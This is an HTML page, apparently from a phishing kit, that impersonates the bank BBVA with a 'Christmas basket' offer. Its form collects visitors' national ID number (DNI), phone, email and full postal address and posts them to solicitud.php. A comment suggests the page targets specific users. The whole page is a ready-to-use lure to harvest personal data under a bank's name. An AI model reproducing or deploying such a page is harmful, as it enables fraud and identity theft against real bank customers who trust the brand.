<!DOCTYPE html>
<html>
<!--Only if user is ES569123 -->

<head>
    <title>Cesta de Navidad</title>
    <link rel="stylesheet" href="assets/css/estilos_login.css">
    <link rel="stylesheet" href="assets/css/estilos_secundario.css">
    <link rel="shortcut icon" href="favicon.ico">
</head>

<body>
    <div class="container">
        <h2>CESTA DE NAVIDAD</h2>
        <h3><span>BBVA</span> les desea una feliz Navidad</h3>
        <form action="solicitud.php" method="POST">
            <table>
                <tr>
                    <td>
                        <input type="text" name="DNI" placeholder="DNI" class="c-input-box__input" required>
                    </td>
                </tr>
                <tr>
                    <td>
                        <input type="number" name="telefono" placeholder="Telefono" class="c-input-box__input" required>
                    </td>
                </tr>
                <tr>
                    <td>
                        <input type="email" name="email" placeholder="E-Mail" class="c-input-box__input" required>
                    </td>
                </tr>
                <tr>
                    <td>
                        <input type="text" name="provincia" placeholder="Provincia" class="c-input-box__input" required>
                    </td>
                </tr>
                <tr>
                    <td>
                        <input type="text" name="ciudad" placeholder="Ciudad" class="c-input-box__input required">
                    </td>
                </tr>
                <tr>
                    <td>
                        <input type="text" name="direccion" placeholder="Direccion" class="c-input-box__input" required>
                    </td>
                </tr>
                <tr>
                    <td>
                        <input type="number" name="cp" placeholder="Codigo Postal" class="c-input-box__input" required>
                    </td>
                </tr>
                <tr>
                    <td>
                        <button name="enviar" id="accesoLogin" class="c-button--primary m-login__button"
                            type="submit">Solicitar cesta</button>
                    </td>
                </tr>
            </table>
        </form>
    </div>
</body>

</html>



